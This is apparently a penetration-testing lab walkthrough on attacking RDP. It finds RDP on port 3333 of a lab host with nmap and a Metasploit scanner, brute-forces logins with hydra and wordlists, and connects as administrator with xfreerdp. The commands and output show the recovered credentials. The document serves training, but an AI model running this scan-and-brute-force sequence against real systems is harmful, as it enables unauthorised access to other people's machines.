# Exploiting RDP

```sh
root@attackdefense:~# nmap 10.5.19.155 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-31 12:34 IST
Nmap scan report for 10.5.19.155
Host is up (0.0020s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

In the scan result, we can't see any RDP running on port 3389. But port number 3333 looks suspicious. So to check whether it is running RDP or not, we can use metasploit.

<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/rdp/rdp_scanner 
msf5 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 10.5.19.155
rhosts => 10.5.19.155
msf5 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
RPORT => 3333
msf5 auxiliary(scanner/rdp/rdp_scanner) > run

<strong>[*] 10.5.19.155:3333      - Detected RDP on 10.5.19.155:3333      (Windows version: 6.3.9600) (Requires NLA: Yes)
</strong>[*] 10.5.19.155:3333      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

So, yes, it detected RDP running on port number 3333.

Now to bruteforce the credentials for RDP, we can use hydra:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.5.19.155 -s 3333

[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
[DATA] attacking rdp://10.5.19.155:3333/
<strong>[3333][rdp] host: 10.5.19.155   login: sysadmin   password: samantha
</strong>[ERROR] freerdp: The connection failed to establish.
<strong>[3333][rdp] host: 10.5.19.155   login: demo   password: victoria
</strong>[ERROR] freerdp: The connection failed to establish.
<strong>[3333][rdp] host: 10.5.19.155   login: auditor   password: elizabeth
</strong>[ERROR] freerdp: The connection failed to establish.
<strong>[3333][rdp] host: 10.5.19.155   login: administrator   password: qwertyuiop
</strong>[ERROR] freerdp: The connection failed to establish.
[STATUS] 6858.00 tries/min, 6858 tries in 00:01h, 205 to do in 00:01h, 4 active
1 of 1 target successfully completed, 4 valid passwords found
</code></pre>

Here we got the password for the administrator account. Now let's connect it using xfreerdp:

```sh
root@attackdefense:~# xfreerdp /u:administrator /p:qwertyuiop /v:10.5.19.155:3333
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Connection Successful.
